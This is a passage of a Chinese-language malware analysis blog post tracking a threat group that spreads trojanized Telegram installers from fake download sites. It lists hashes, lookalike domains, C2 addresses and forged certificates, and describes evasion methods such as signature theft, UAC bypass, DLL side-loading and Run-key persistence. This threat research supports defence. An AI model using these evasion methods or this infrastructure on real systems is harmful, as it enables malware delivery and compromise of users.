2\n\n005e381cb39d53c4574f418f8fd4349fa2ad582950b62b08e8064be580f11d3c\n04acd866ea0db5b1941601f7045f283841d80aaefa12bb5819027ab34d53a578\n0dc1dfbe8876f73ff5541ef95b28424c898cd0356ea1076ceba71d938dd1542f\n1d496cf700989c37d8909de3aec78bc09f8f2d3313833f8d3977ffacc4e8562a\n1d691137733a5a851baf3e2543b003b7b8d930919a22dc2be91f42bc2456683b\n2e29c4fdc92aef0afb417e5beb2ad97bf0728c70a00b7ef3a891168fcda53fc6\n31cd9a8af5f968616ad1de617090cd5f8f27fbdd4003787b0afceb8688dadb5a\n3d792cde223521f0eaa572e3d1047c1f7cede4723b1b94ce2caad43e1a1dbbd4\n3de50a7a18d077f6798c4a0f7f4e464a0465f550beb3ca1ce4d532200a097621\n43f05f360cfd3d5570044c249180ca69956348aa36cf29c35b512f621def0d7a\n4ffcdb1ea7b09a1e5acb62618e84282a5885700d6021bfd71a52a29a21c5dc2c\n545bfbc5ba031e9a618b1fd4335b4903b107d810810ada52cfd90f3dad0e0093\n5d824f213cb523fbf0d22821a7ecdc2ae4b236940dc2fd34b7c7da9e81a725c5\n60505f49062b3f9da11c4504b08de3d464fb9f61a6f6a4eaf0518aeb52f557e5\n65a4bf0651b6ccd9c6720d7544c7e152b135d6aa2b9613205a883943619b5623\n678a48647b4d29a8e910905308412e043b9f3c998e635f78b10fcbf88d8d11bc\n6b1b3c42e416585de92245baad11b6685764b7d8c62c68648015f0ca3940271f\n6d419d7d009a04faf99d749fdc89ad38fc9087ba14f459530b07cbf4cdacdd22\n79cbb0787121082bc579bd53fe3e66cdb894085bc7985c63eebdf97615095b6c\n7fb7752513ebb52d0a1e25cea30287e2fd28cf62f0d71a6c9557b74f2822cbad\n84e63e5ccb04af4af9728cfa0666e6cb3dc0dc5dfd8aad2c7c0e783ce29e01fe\n86175de725b6db0ba20bf2f182fdebce69962c53a80283866dc85ca97be26558\nba62ffc87ceb56c4429b2920cfd4c799b85294c0a1c0173c6e1e814e173a8ad6\nbbbf5c0dadd05d330ac217800fc1e77608cb20b661cc9978efe75749016fb940\nc3d2c8a41be2751ee589a25c9121f88e884449b8353d250e9d5c6afb87cefaf4\nc404aa57d3539c077b77d1b7558ad45613e2ffc34982a88e48987ae1ef9828bf\nc6537b257f76dcbbc8b5f82be2278f243da19d185035142d41a08b4a9a7f607c\nce6053b94ad5a0361cf3b40fb57b8428540a81b403929fee1c5dff63272e6505\ndf78865d0ca7b4eb222bb8a615cb753c6ade24bb001fd4e4faa82ef107c0a00e\nfa5c0489f0669d0040267d5eae10771433cfc395da9de3a7ead8ce136c76b07e\n\nSoftware Pakcer Protected\n\n8db626c808333c32afee3ea81af391762f5faad6c739ff885d2a5fd6b86cb8e4\na3fd90794da97bd7840f1de9ac17c3834c3c24fa0b6bb20cc1f25564df3399b1\nb178ac5583677fa8174d73879d56caba35424cf4240f945c0c18e1f9f0a743a7\nd780a6a08cacb2e6e07deb4549c689e3fbaa1e526dedf42612ec77847b5e9758\nfd885c0cd5dc366d27cf0deb544e7c8887007d8d9a753979793de3e7affeb7c2\n\n\n\n\nDomain\nCreation Date\n\n\n\nbensonman.run\n2020-07-07T00:10:21Z\n\n\ntelegram-vip.com\n2020-09-21T06:44:59Z\n\n\ntelegramvips.com\n2020-10-31T13:34:04Z\n\n\nii-telegram.com\n2020-11-04T03:54:40Z\n\n\nyy-telegram.com\n2020-11-04T03:54:40Z\n\n\nmm-telegram.com\n2020-11-04T03:54:40Z\n\n\na2-telegram.com\n2020-11-05T06:31:22Z\n\n\nak-telegram.com\n2020-11-05T06:31:22Z\n\n\na3-telegram.com\n2020-11-05T06:31:22Z\n\n\na1-telegram.com\n2020-11-05T06:31:22Z\n\n\ntt-telegram.com\n2020-11-05T06:31:24Z\n\n\nkk-telegram.com\n2020-11-05T06:31:24Z\n\n\npotato.fit\n2020-12-01T02:06:07Z\n\n\na6-telegram.com\n2020-12-01T08:36:30Z\n\n\na7-telegram.com\n2020-12-03T05:55:37Z\n\n\npotato.red\n2020-12-09T10:21:14Z\n\n\napotato.net\n2020-12-15T02:30:16Z\n\n\napotato.xyz\n2020-12-15T02:30:17Z\n\n\nll-telegram.com\n2020-12-16T12:11:04Z\n\n\nc3-telegram.com\n2020-12-19T03:31:02Z\n\n\ng3telegram.com\n2020-12-28T10:28:02Z\n\n\ntelecnsr.com\n2020-12-30T09:00:07Z\n\n\ndlyunsvr.com\n2021-01-05T04:41:42Z\n\n\nkelectsv.com\n2021-01-05T04:41:42Z\n\n\n\n\n\nC2 IP\nASN\nCountry\n\n\n\n103.37.0.178\n136800\nCN\n\n\n154.222.103.58\n136800\nHK\n\n\n154.222.103.59\n136800\nHK\n\n\n154.222.103.60\n136800\nHK\n\n\n156.255.212.187\n136800\nHK\n\n\n156.255.212.190\n136800\nHK\n\n\n175.24.112.88\n45090\nCN\n\n\n185.224.168.130\n132721\nHK\n\n\n185.224.168.131\n132721\nHK\n\n\n185.224.168.132\n132721\nHK\n\n\n202.87.221.102\n24321\nMY\n\n\n45.64.54.85\n38197\nHK\n\n\n","dateCreated":"2021-01-20T23:46:39+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2021-01-20T23:46:39+00:00","description":"繼前一篇 分析一個加料的 Telegram for Windows 中文版安裝程式 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。","headline":"追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析","image":["thumbnail.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/","keywords":"Malware, Telegram, Trojan","thumbnailUrl":"thumbnail.png"}</script>
+    
+    <meta name="description" content="繼前一篇 分析一個加料的 Telegram for Windows 中文版安裝程式 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析">
+<meta property="og:url" content="https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
+<meta property="og:description" content="繼前一篇 分析一個加料的 Telegram for Windows 中文版安裝程式 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/thumbnail.png">
+<meta property="article:published_time" content="2021-01-20T23:46:39.000Z">
+<meta property="article:modified_time" content="2025-01-17T13:11:17.352Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Malware">
+<meta property="article:tag" content="Telegram">
+<meta property="article:tag" content="Trojan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/thumbnail.png">
+<meta name="twitter:creator" content="@The0_Klein">
+    
+    
+        
+    
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/thumbnail.png"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/thumbnail.png"/>
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">
+
+    <!--STYLES END-->
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106120242-2');
+    </script>
+
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+    
+
+<header id="header" data-behavior="2">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            &lt;Theo/&gt;
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+    
+
+<nav id="sidebar" data-behavior="2">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Theo Chen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/TheoKlein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/The0_Klein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/theo-chen/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:theokleintw@gmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/rss2.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="2"
+                 class="
+                        hasCoverMetaOut
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2021-01-20T23:46:39+00:00">
+	
+		    Jan 20, 2021
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Research/">Research</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>繼前一篇 <a href="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/">分析一個加料的 Telegram for Windows 中文版安裝程式</a> 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。<span id="more"></span></p>
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E5%81%87%E7%B0%BD%E7%AB%A0"><span class="toc-text">真假簽章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F%E7%9A%84%E6%94%B9%E8%AE%8A"><span class="toc-text">安裝程式的改變</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Advanced-Installer"><span class="toc-text">Advanced Installer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSIS"><span class="toc-text">NSIS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NSIS-Type-1"><span class="toc-text">NSIS Type 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NSIS-Type-2"><span class="toc-text">NSIS Type 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NSIS-Type-3"><span class="toc-text">NSIS Type 3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NSIS-Type-3-1"><span class="toc-text">NSIS Type 3-1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NSIS-Type-3-2"><span class="toc-text">NSIS Type 3-2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-MFC"><span class="toc-text">Windows MFC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MFC-Type-1"><span class="toc-text">MFC Type 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MFC-Type-2"><span class="toc-text">MFC Type 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Software-Packer"><span class="toc-text">Software Packer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%90%E8%AA%9E"><span class="toc-text">結語</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6%EF%BC%9AIoCs"><span class="toc-text">附件：IoCs</span></a></li></ol>
+
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>陸續有其他安全廠商針對該集團的攻擊發表相關文章：</p>
+<ul>
+<li>2020&#x2F;11&#x2F;09 <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/26865">金眼狗组织水坑活动：针对Telegram用户的定向攻击</a></li>
+<li>2020&#x2F;12&#x2F;15 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225621">“看门狗”团伙远控木马投毒计</a></li>
+<li>2021&#x2F;01&#x2F;08 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/281462756">“伪装者”活动:针对Telegram特定用户的攻击</a></li>
+</ul>
+<p>可以得知其背後可能是屬於 金眼狗 集團（GoldenEyeDog），又稱 看門狗 集團，長期透過偽造通訊軟體網站或釣魚郵件攻擊特定族群。偽造 Telegram 中文版網站誘使使用者下載捆綁了木馬程式的 Telegram 便是<a href="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/">前一篇文章</a>所說的內容。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p1.png" title="Figure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑" data-caption="Figure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑" data-fancybox="default"><img class="fig-img" src="p1.png" alt="Figure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑"></a><span class="caption">Figure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑</span></div>
+
+<p>在這段期間持續觀察的過程中，發現該集團在短時間內積極的嘗試了多種手段試圖規避檢測，包括：</p>
+<ul>
+<li>使用名稱相似的假簽章誤導使用者</li>
+<li>使用「簽章竊取」的手法盜用官方 Telegram 的簽章</li>
+<li>改變安裝程式的打包方式</li>
+<li>利用 Windows COM 界面繞過 UAC</li>
+<li>使用合法且具備正常簽章的程式搭配 DLL Side-Loading 的手段</li>
+<li>使用軟體保護工具（加殼）</li>
+<li>加入 anti-debugger &#x2F; anti-vm 的手法來規避分析</li>
+</ul>
+<h2 id="真假簽章"><a href="#真假簽章" class="headerlink" title="真假簽章"></a>真假簽章</h2><table>
+<thead>
+<tr>
+<th align="center">CertificateName</th>
+<th align="center">SerialNumber</th>
+<th align="center">ValidFrom</th>
+<th align="center">ValidTo</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Adobe Inc.</td>
+<td align="center">01</td>
+<td align="center">2020-07-13T12:54:42+00:00</td>
+<td align="center">2022-07-03T12:54:42+00:00</td>
+</tr>
+<tr>
+<td align="center">Driver Information Technology Co., Ltd.</td>
+<td align="center">81 3b 66 fe d5 8a ab 24 d0 2b 65 a9 30 1f 61 3a</td>
+<td align="center">2020-09-04T00:00:00+00:00</td>
+<td align="center">2021-05-22T23:59:59</td>
+</tr>
+<tr>
+<td align="center">OORT inc.</td>
+<td align="center">02 bf 32 f9 ab 47 2e d1 cf 33 a2 7c 06 f9 b3 b9</td>
+<td align="center">2020-09-25T00:00:00+00:00</td>
+<td align="center">2021-09-22T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">OORT inc.</td>
+<td align="center">53 78 c5 bb eb a0 d3 30 9a 35 bb 47 f6 30 37 f7</td>
+<td align="center">2020-09-29T00:00:00+00:00</td>
+<td align="center">2021-09-22T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">OORT inc.</td>
+<td align="center">98 be 45 2e da f1 46 4a 38 06 79 06 81 0b 4e b4</td>
+<td align="center">2020-09-30T00:00:00+00:00</td>
+<td align="center">2021-09-22T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">OORT inc.</td>
+<td align="center">ec f1 57 7f dc f2 f9 f0 30 f9 d7 12 09 99 00 ab</td>
+<td align="center">2020-10-15T00:00:00+00:00</td>
+<td align="center">2021-10-12T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">LOGMEIN, INC.</td>
+<td align="center">1c 0d 4a 65 8b eb 7c b2 e6 f9 16 d9 b0 ef f7 20</td>
+<td align="center">2020-11-05T00:00:00+00:00</td>
+<td align="center">2021-11-03T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">LOGMEIN, INC.</td>
+<td align="center">d6 bb fa 3c 06 db 6f 44 7e 59 56 3d 34 9d dc b1</td>
+<td align="center">2020-11-12T00:00:00+00:00</td>
+<td align="center">2021-11-03T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">Google LLC</td>
+<td align="center">01</td>
+<td align="center">2020-11-12T13:11:49+00:00</td>
+<td align="center">2021-11-12T13:11:49+00:00</td>
+</tr>
+<tr>
+<td align="center">LogMeIn, Inc.</td>
+<td align="center">eb 6c e3 39 df c4 6c 48 ab 44 67 1b d6 38 4e 9f</td>
+<td align="center">2020-11-16T00:00:00+00:00</td>
+<td align="center">2021-11-16T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">LogMeIn, Inc.</td>
+<td align="center">84 f4 2d 39 2e ab 89 6c fd c9 46 62 40 54 e0 8e</td>
+<td align="center">2020-11-27T00:00:00+00:00</td>
+<td align="center">2021-11-16T23:59:59+00:00</td>
+</tr>
+<tr>
+<td align="center">Cockos Incorporated</td>
+<td align="center">01</td>
+<td align="center">2020-12-17T04:09:15+00:00</td>
+<td align="center">2021-12-17T04:09:15+00:00</td>
+</tr>
+<tr>
+<td align="center">Beijing Baidu Netcom Science and Technology Co.,Ltd</td>
+<td align="center">01</td>
+<td align="center">2020-12-18T10:36:33+00:00</td>
+<td align="center">2021-12-18T10:36:33+00:00</td>
+</tr>
+<tr>
+<td align="center">Beijing Kingsoft Security software Co.,Ltd</td>
+<td align="center">01</td>
+<td align="center">2020-12-18T10:51:25+00:00</td>
+<td align="center">2021-12-18T10:51:25+00:00</td>
+</tr>
+<tr>
+<td align="center">SHENZHEN THUNDER NETWORKING TECHNOLOGIES LTD.</td>
+<td align="center">01</td>
+<td align="center">2020-12-18T13:30:06+00:00</td>
+<td align="center">2021-12-18T13:30:06+00:00</td>
+</tr>
+</tbody></table>
+<p>上面表格是根據 ValidFrom 做排序，從我收集到的樣本中整理出來的。整體來看，看門狗集團除了冒用一些軟體開發商的名稱來建立簽章以外，也會使用改變大小寫的方式來混淆使用者的辨別。</p>
+<p>除此之外值得一提的是，該攻擊者也使用過「簽章竊取」的手法來盜用官方 Telegram 的簽章。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p2.png" title="Figure 2. 簽章竊取的結果" data-caption="Figure 2. 簽章竊取的結果" data-fancybox="default"><img class="fig-img" src="p2.png" alt="Figure 2. 簽章竊取的結果"></a><span class="caption">Figure 2. 簽章竊取的結果</span></div>
+
+<p>關於簽章竊取的手法可以參考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">Authenticode签名伪造——PE文件的签名伪造与签名验证劫持</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/aaaddress1/SignThief">https://github.com/aaaddress1/SignThief</a></li>
+</ul>
+<p>使用簽章竊取手法盜用官方簽章的樣本：</p>
+<table>
+<thead>
+<tr>
+<th>SHA256</th>
+<th>Compile Time</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ec99947be1de325fe151edbf46535cc508ab65dd22778213c3cafcfeb9cb8c91</td>
+<td>2020-12-30T14:24:00</td>
+</tr>
+<tr>
+<td>b15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9</td>
+<td>2020-12-02T07:12:01</td>
+</tr>
+<tr>
+<td>08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3</td>
+<td>2020-11-24T15:35:53</td>
+</tr>
+<tr>
+<td>1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81</td>
+<td>2020-11-22T09:46:10</td>
+</tr>
+</tbody></table>
+<h2 id="安裝程式的改變"><a href="#安裝程式的改變" class="headerlink" title="安裝程式的改變"></a>安裝程式的改變</h2><p>在近三個月的時間裡，光是偽造的安裝程式本身就有許多不同的型態，攻擊者積極的嘗試使用不同的安裝系統來包裝木馬程式。</p>
+<h3 id="Advanced-Installer"><a href="#Advanced-Installer" class="headerlink" title="Advanced Installer"></a>Advanced Installer</h3><p>這個型態是我在做關聯分析的時候往回找到的，使用 <a target="_blank" rel="noopener" href="https://www.advancedinstaller.com/">Advanced Installer</a> 來打包安裝程式。從 Virustotal 的樣本上傳時間來看是在 2020 年 10 月初，大致和接下來 NSIS 打包的樣本差不多時間出現。可以透過 <a target="_blank" rel="noopener" href="https://github.com/Bioruebe/UniExtract2">UniExtract2</a> 將包裝內容解開，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">. </span><br><span class="line">├── CommonAppDataFolder               // 對應到 C:\ProgramData</span><br><span class="line">│ ├── fff.reg                         // 透過 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 實現持久化</span><br><span class="line">│ ├── Server.lnk                      // regedit.exe /s C:\ProgramData\fff.reg</span><br><span class="line">│ └── test.url                        // file:///C:/PerfLog/AddInProcess.exe</span><br><span class="line">├── Telegram.exe                      // 正常的 Telegram</span><br><span class="line">├── TgCn.msi                          // Advanced Installer 的安裝啟動器</span><br><span class="line">├── Updater.exe                       // 正常的 Telegram Update</span><br><span class="line">└── WindowsVolume                     // 對應到 C:\</span><br><span class="line">    └── PerfLog </span><br><span class="line">        ├── AddInProcess.exe          // reflective Backdoor loader</span><br><span class="line">        └── AddInProcess.exe.config</span><br></pre></td></tr></table></figure>
+
+<blockquote>
